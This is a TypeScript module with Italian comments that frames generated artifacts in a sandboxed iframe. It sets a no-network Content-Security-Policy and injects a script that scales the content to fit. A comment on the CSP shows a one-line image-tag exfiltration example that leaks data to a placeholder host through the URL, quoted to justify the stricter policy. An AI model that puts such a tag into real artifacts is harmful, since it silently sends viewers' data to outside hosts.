/**
 * Come si inquadra un artefatto dentro un iframe: una regola sola, due viste.
 *
 * Era duplicata — stesso CSP e stesso script di fit in `ArtifactCanvas` e nella
 * pagina `/preview` — e quindi era sbagliata in due posti insieme. Il 10 ago
 * 2026 un documento di più pagine si vedeva schiacciato sia nel pannello sia a
 * schermo intero: «pagine molto piccole nel tentativo di fittarle tutte
 * insieme». Correggerne una sola avrebbe curato metà del sintomo.
 *
 * ## La regola
 *
 * Si adatta sempre alla **larghezza**, mai ingrandendo. Poi si adatta anche
 * all'altezza — ma solo se per farlo non serve rimpicciolire sotto
 * `MIN_ZOOM_INTERO`.
 *
 * Le due metà servono a due cose diverse, ed è per questo che la regola non è
 * una sola:
 *
 *  - un artefatto **a tela fissa** — una cover 1200×1500, un diagramma — si
 *    coglie in un colpo d'occhio, e vederlo intero è tutto il punto;
 *  - un **documento** si legge scorrendo. Rimpicciolirlo finché dieci pagine
 *    stanno in un riquadro alto 260 pixel non lo mostra: lo cancella.
 *
 * La soglia è espressa in **leggibilità**, non in numero di schermate. La prima
 * versione contava le schermate (≤1,6) e una cover 1200×1500 in una finestra
 * 1024×720 finiva per un soffio dalla parte sbagliata: si sarebbe messa a
 * scorrere, cioè esattamente il caso per cui il fit esisteva. L'ha trovata un
 * test sull'aritmetica prima che lo facesse qualcuno guardando lo schermo.
 *
 * Chiedersi «quanto devo rimpicciolire?» risponde alla domanda giusta: sotto
 * una certa scala non si legge più niente, e allora scorrere è l'unica lettura
 * possibile. Nel dubbio si scorre: una barra di scorrimento costa un gesto, una
 * pagina illeggibile costa il documento.
 */

/** Scala minima accettabile per mostrare un artefatto INTERO. Sotto questa, far
 *  entrare tutto smette di mostrare e comincia a cancellare: si scorre invece.
 *  Una cover 1200×1500 in una finestra 1024×720 richiede ~0,48 e resta
 *  leggibile; una pagina A4 di solo testo ne richiederebbe ~0,42 e no. */
export const MIN_ZOOM_INTERO = 0.45;

/** CSP dell'iframe: **nessuna rete**, né in entrata né in uscita. Solo ciò che
 *  l'artefatto porta con sé (`data:`, `blob:`) e ciò che scrive inline.
 *
 *  Prima ammetteva `https:` su `img-src`, `style-src`, `font-src` e `media-src`.
 *  Una richiesta di risorsa **è un canale**: `<img src="https://x/leak?d=…">`
 *  parte dal browser dell'owner, con la sua rete e la sua uscita, e non serve
 *  nessuna risposta per aver consegnato i dati — sta tutto nell'URL. Un
 *  artefatto è contenuto GENERATO: chi lo scrive non è chi lo guarda, ed è la
 *  ragione per cui gira in un iframe a origine opaca. Lasciargli un GET verso
 *  qualunque host annulla metà di quel confinamento (clodia-platform#175, riga
 *  #108).
 *
 *  Le quattro direttive si tolgono INSIEME: chiudere solo `img-src` sposta il
 *  canale, non lo chiude — `<video src>`, un `@font-face` remoto o un
 *  `<link rel=stylesheet>` fanno lo stesso GET con lo stesso effetto. Il resto
 *  (`connect-src`, `frame-src`, `form-action`) resta coperto da
 *  `default-src 'none'`.
 *
 *  Costo dichiarato: un artefatto che referenzia un'immagine, un CSS o un font
 *  remoto non li carica più. Le immagini che la piattaforma produce sono già
 *  `data:`/`blob:` (vedi `/preview`, dove il markdown incorpora i byte), quindi
 *  il caso che si perde è la risorsa di terzi — cioè esattamente quella che non
 *  vogliamo far chiedere dal browser di chi legge. */
export const CSP =
	'<meta http-equiv="Content-Security-Policy" content="' +
	"default-src 'none'; img-src data: blob:; style-src 'unsafe-inline'; " +
	"script-src 'unsafe-inline'; font-src data:; media-src data: blob:" +
	'">';

export const FIT =
	'<style>html,body{margin:0}html{overflow-x:hidden;overflow-y:auto}</style>' +
	'<script>(function(){var Z=' + MIN_ZOOM_INTERO + ';function f(){' +
	'var e=document.documentElement,b=document.body;if(!b)return;e.style.zoom="1";' +
	'var w=Math.max(e.scrollWidth,b.scrollWidth),h=Math.max(e.scrollHeight,b.scrollHeight);' +
	'if(!w||!h)return;' +
	// larghezza: sempre, e mai oltre 1 — ingrandire sgrana e non aggiunge nulla.
	'var z=Math.min(innerWidth/w,1);' +
	// altezza: solo se per farci stare tutto non si scende sotto la scala
	// minima leggibile. Altrimenti si scorre.
	'var zi=Math.min(z,innerHeight/h);if(zi>=Z){z=zi;}' +
	'e.style.zoom=String(z);}' +
	'addEventListener("load",f);addEventListener("resize",f);' +
	'setTimeout(f,0);setTimeout(f,250);setTimeout(f,800);})();<\/script>';

export const HEAD_INJECT = CSP + FIT;

/** Inserisce CSP e fit nell'`<head>` dell'artefatto, o in testa se non ne ha. */
export function withInject(raw: string, inject: string = HEAD_INJECT): string {
	if (/<head[^>]*>/i.test(raw)) return raw.replace(/<head[^>]*>/i, (m) => m + inject);
	return inject + raw;
}
